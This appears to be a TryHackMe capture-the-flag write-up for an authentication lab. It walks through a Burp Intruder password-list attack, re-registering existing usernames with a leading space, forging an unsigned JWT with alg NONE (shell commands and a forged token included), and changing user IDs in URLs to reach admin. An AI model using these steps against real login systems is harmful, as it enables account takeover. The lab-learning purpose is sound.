# Room
https://tryhackme.com/room/authenticate

# Task 1 - Start
Deploy VM

# Task 2 - Dictionary Attacks
For dictionary attacks you can use Hydra, Medusa, and Burp Suite among others

* Load Burp and navigate to the site: http://e.f.g.h:8888
* Turn off intercept in Burp
* Login as jack with a dummy password through the web browser
* In Burp...
* View HTTP History, right click the POST /login request and send to intruder
* In the Positions tab, clear all
* Highlight the dummy password and click add
* View Payloads
* Load the first 100 entries from rockyou.txt and
    * cat /usr/share/wordlists/rockyou.txt | head -100 > /usr/share/wordlists/rockyou-first1000.txt
* Start attack
* Sort the attack window by length and notice the password that worked
* Login with jack and the correct password
* Grab first flag
* Repeat the process for mike

# Task 3 - Re-registration
Re-registration is an attack when you register a user that is similar to another, for example "admin" and " admin", notice the space in the second one

* Navigate to the site: http://e.f.g.h:8888
* The user darren already exists, re-register darren with a space in front of the name
* Login, you now have access to everything that darren does
* Repeat the same for arthur

# Task 4 - JSON Web Token
JSON Web Token (JWT) is a commonly used method for authorization.  JWT lets the website know what kind of access the currently logged in user has.

* JWT has 3 parts separated by a dot that ise base64 encoded
    * Header - algorithm and type of token
    * Payload - access given to the user
    * Signature - integrity portion
* Research : https://jwt.io/#debugger-io
* You can brute force JWT to gain access to the secret used to encrypt the JWT token, which you can then use to generate new tokens

### Practical
* Load Burp and navigate to http://e.f.g.h:5000
* Turn off intercept in Burp
* Login as user / user, click Go
* In Burp...
* View HTTP History, notice the GET request for /protected
* View the request and grab the JWT
    ```
    Authorization: JWT eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2MTIyMjMyNzMsImlhdCI6MTYxMjIyMjk3MywibmJmIjoxNjEyMjIyOTczLCJpZGVudGl0eSI6MX0.1B9BNSDx2lgMOnXpOjPejAikXTpazluY0Z5AGziQDvY
    ```
* The JWT is base64 encoded into 3 parts delimited by the .
    ```
    echo "Authorization: JWT eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2MTIyMjMyNzMsImlhdCI6MTYxMjIyMjk3MywibmJmIjoxNjEyMjIyOTczLCJpZGVudGl0eSI6MX0.1B9BNSDx2lgMOnXpOjPejAikXTpazluY0Z5AGziQDvY" | cut -d" " -f3 | cut -d. -f1 | base64 -d
    {"typ":"JWT","alg":"HS256"}    

    echo "Authorization: JWT eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2MTIyMjMyNzMsImlhdCI6MTYxMjIyMjk3MywibmJmIjoxNjEyMjIyOTczLCJpZGVudGl0eSI6MX0.1B9BNSDx2lgMOnXpOjPejAikXTpazluY0Z5AGziQDvY" | cut -d" " -f3 | cut -d. -f2 | base64 -d
    {"exp":1612223273,"iat":1612222973,"nbf":1612222973,"identity":1}    
    ```
* While still logged in as user / user, open developer tools in the browser
* In Firefox go to Storage > Local Storage and then view the access_token, this token is what identifies you as the user
* We can change ourselves to user2 by editing the access_token value and modify the JWT to not use encryption
    ```
    echo '{"typ":"JWT","alg":"NONE"}' | base64
    eyJ0eXAiOiJKV1QiLCJhbGciOiJOT05FIn0K    

    echo '{"exp":1612223273,"iat":1612222973,"nbf":1612222973,"identity":2}' | base64
    eyJleHAiOjE2MTIyMjMyNzMsImlhdCI6MTYxMjIyMjk3MywibmJmIjoxNjEyMjIyOTczLCJpZGVudGl0eSI6Mn0K

    Combine first and second with a trailing .

    eyJ0eXAiOiJKV1QiLCJhbGciOiJOT05FIn0K.eyJleHAiOjE2MTIyMjMyNzMsImlhdCI6MTYxMjIyMjk3MywibmJmIjoxNjEyMjIyOTczLCJpZGVudGl0eSI6Mn0K.

    Press Go, we are now user 2
    ```
* To find admin, we'll repeat the process except we'll use an identity of 0 instead of 2

# Task 5 - No Auth
When systems are not secured it is possible for you to change your user/profile ID to another and gain access to that other user
* Navigate to http://e.f.g.h:7777/users/1
* See that you are logged in as user 1
* Now go to http://e.f.g.h:7777/users/2
* You are user 2
* Finally go to http://e.f.g.h:7777/users/0
* You are the admin